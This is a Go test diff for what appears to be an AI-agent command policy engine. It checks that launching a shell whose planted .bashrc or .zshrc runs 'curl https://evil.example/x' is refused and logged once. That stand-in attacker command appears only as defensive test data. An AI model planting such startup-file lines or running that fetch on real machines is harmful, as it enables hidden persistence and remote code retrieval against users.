@@ -4,6 +4,8 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"os"
+	"path/filepath"
 	"testing"
 
 	"github.com/zybuu-ai/abhed/internal/policy"
@@ -198,5 +200,37 @@ func TestManualAuthorizeJudgesTheCall(t *testing.T) {
 	}
 	if _, refused, err := l.ManualAuthorize("mover", "m2", json.RawMessage(`{"command":"look"}`)); err != nil || refused != nil {
 		t.Fatalf("a reading call was refused: %v %v", refused, err)
+	}
+}
+
+// A shell typed at a terminal reads a planted .bashrc or .zshrc: the line's own
+// judgement refuses it and is the one recorded, in shell and in lines mode.
+func TestTypedShellIsJudgedWithItsStartupFilesOnce(t *testing.T) {
+	l, store := manualLoop(t)
+	ws, home := t.TempDir(), t.TempDir()
+	l.Policy.Roots = func() []string { return []string{ws} }
+	l.Policy.Cwd = func() string { return ws }
+	l.Policy.Home = func() (string, bool) { return home, true }
+	l.Policy.Evaluate("bash", true, bashArgs("true"))
+	for _, n := range []string{".bashrc", ".zshrc"} {
+		if err := os.WriteFile(filepath.Join(home, n), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	for i, line := range []string{"bash", "exec zsh"} {
+		id := fmt.Sprintf("s%d", i)
+		if refused, err := l.ManualScreen(id, line); err != nil || refused == nil {
+			t.Fatalf("shell mode let %q through: %v", line, err)
+		}
+		if ds := decisionsOf(t, store, id); len(ds) != 1 || ds[0].Type != EvActionDenied {
+			t.Fatalf("shell mode %q record: %+v", line, ds)
+		}
+		id = fmt.Sprintf("l%d", i)
+		if tool, refused, _, err := l.ManualAuthorizeTyped(id, bashArgs(line), Unanswered); err != nil || refused == nil || tool != nil {
+			t.Fatalf("lines mode let %q through: %v", line, err)
+		}
+		if ds := decisionsOf(t, store, id); len(ds) != 1 || ds[0].Type != EvActionDenied {
+			t.Fatalf("lines mode %q record: %+v", line, ds)
+		}
 	}
 }
